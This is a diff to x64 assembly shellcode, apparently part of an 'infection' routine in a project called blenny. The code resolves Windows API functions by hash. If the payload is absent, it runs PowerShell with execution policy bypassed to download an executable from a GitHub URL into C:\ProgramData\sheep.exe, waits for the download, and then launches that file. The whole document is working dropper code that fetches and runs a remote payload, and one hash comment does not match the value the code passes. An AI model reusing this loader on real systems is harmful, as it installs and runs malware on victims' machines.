@@ -22,13 +22,12 @@ main:
    
    call infection__data         ; perform a call-pop to get offsets to our data
 infection__data__start:         ; this prevents relocations from forming because we are not
-infection__data__urlmon:        ; using absolute addresses for our data, making it more portable
-   db "urlmon.dll",0
 infection__data__sheep:
    db "C:\\ProgramData\\sheep.exe",0
-infection__data__download_url:
-   db "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",0
-
+infection__data__powershell:
+   db "powershell -ExecutionPolicy bypass ",
+      "-Command \"(New-Object System.Net.WebClient).DownloadFile(",
+      "'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')\"",0
 infection__data:
    pop rbx                      ; get the pointer to the start of the data
    mov rax, [gs:0x60]           ; get current PEB
@@ -38,23 +37,30 @@ infection__data:
    mov rax, [rcx]               ; list_entry->InLoadOrderLinks.Flink (kernel32.dll)
    mov r12, [rax+0x30]          ; list_entry->DllBase
    mov rcx, r12
-   mov edx, 0x53b2070f
-   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x53b2070f)
-   mov rdi, rax                 ; get function for LoadLibraryA
-   mov rcx, r12
    mov edx, 0xda1a7563
    call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0xda1a7563)
    mov rsi, rax                 ; get function for GetFileAttributesA
    mov rcx, r12
+   mov edx, 0x53b2070f
+   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x71948ca4)
+   mov rdi, rax                 ; get function for WaitForSingleObject
+   mov rcx, r12
    mov edx, 0x4a7c0a09
    call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x4a7c0a09)
    mov rbp, rax                 ; get function for CreateProcessA
-   lea rcx, [rbx+(infection__data__urlmon-infection__data__start)] ; urlmon.dll
-   call rdi                                                        ; LoadLibraryA("urlmon.dll")
-   mov rcx, rax
-   mov edx, 0xd8d746fc
-   call get_proc_by_hash        ; get_proc_by_hash(urlmon_module, 0xd8d746fc)
-   mov r12, rax                 ; get function for URLDownloadToFileA
+
+   xor ecx,ecx                  ; zero out the STARTUPINFO structure and the PROCESS_INFORMATION structure
+   xorps xmm0,xmm0
+   movups [rsp+0x50],xmm0
+   movups [rsp+0x60],xmm0
+   mov dword [rsp+0x70], 0x68
+   movups [rsp+0x74],xmm0
+   movups [rsp+0x84],xmm0
+   movups [rsp+0x94],xmm0
+   movups [rsp+0xa4],xmm0
+   movups [rsp+0xb4],xmm0
+   movups [rsp+0xc4],xmm0
+   mov [rsp+0xd4],ecx
 
    lea rcx, [rbx+(infection__data__sheep-infection__data__start)] ; C:\ProgramData\sheep.exe
    call rsi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
@@ -62,14 +68,39 @@ infection__data:
    jnz infection__payload_exists ; jump taken means the file exists
 
    xor ecx,ecx
-   lea rdx, [rbx+(infection__data__download_url-infection__data__start)] ; big honkin github url
-   lea r8, [rbx+(infection__data__sheep-infection__data__start)] ; the sheep executable
+   lea rdx, [rbx+(infection__data__powershell-infection__data__start)] ; download command
+   xor r8d,r8d
    xor r9d,r9d
-   mov [rsp+0x20],rcx
-   call r12                     ; URLDownloadToFileA(nullptr, "evil_sheep_url.exe", "C:\\ProgramData\\sheep.exe", 0, nullptr)
+   xorps xmm0,xmm0
+   movups [rsp+0x20],xmm0
+   movups [rsp+0x30],xmm0
+   lea rax, [rsp+0x70]
+   mov [rsp+0x40], rax
+   lea rax, [rsp+0x50]
+   mov [rsp+0x48], rax
+   call rbp                     ; CreateProcessA(NULL, powershell_command, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    test eax,eax
-   jnz infection__end           ; URLDownloadToFileA returning nonzero is an error
+   jz infection__end            ; CreateProcessA failing is an error
 
+   mov rcx,[rsp+0x50]
+   mov edx,0xFFFFFFFF
+   call rdi                     ; WaitForSingleObject(proc_info.hProcess, INFINITE)
+   test eax,eax
+   jnz infection__end           ; WaitForSingleObject returns 0 on success
+
+   xor ecx,ecx                  ; zero out the STARTUPINFO structure and the PROCESS_INFORMATION again
+   xorps xmm0,xmm0
+   movups [rsp+0x50],xmm0
+   movups [rsp+0x60],xmm0
+   mov dword [rsp+0x70], 0x68
+   movups [rsp+0x74],xmm0
+   movups [rsp+0x84],xmm0
+   movups [rsp+0x94],xmm0
+   movups [rsp+0xa4],xmm0
+   movups [rsp+0xb4],xmm0
+   movups [rsp+0xc4],xmm0
+   mov [rsp+0xd4],ecx
+   
 infection__payload_exists:
    xor ecx,ecx                                                    ; the executable file (can just use command line arg)
    lea rdx, [rbx+(infection__data__sheep-infection__data__start)] ; the sheep executable
@@ -82,16 +113,6 @@ infection__payload_exists:
    mov [rsp+0x40], rax
    lea rax, [rsp+0x50]
    mov [rsp+0x48], rax
-   movups [rsp+0x50],xmm0
-   movups [rsp+0x60],xmm0
-   mov dword [rsp+0x70], 0x68
-   movups [rsp+0x74],xmm0
-   movups [rsp+0x84],xmm0
-   movups [rsp+0x94],xmm0
-   movups [rsp+0xa4],xmm0
-   movups [rsp+0xb4],xmm0
-   movups [rsp+0xc4],xmm0
-   mov [rsp+0xd4],ecx
    call rbp                     ; CreateProcessA(NULL, sheep_exe, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
 infection__end:
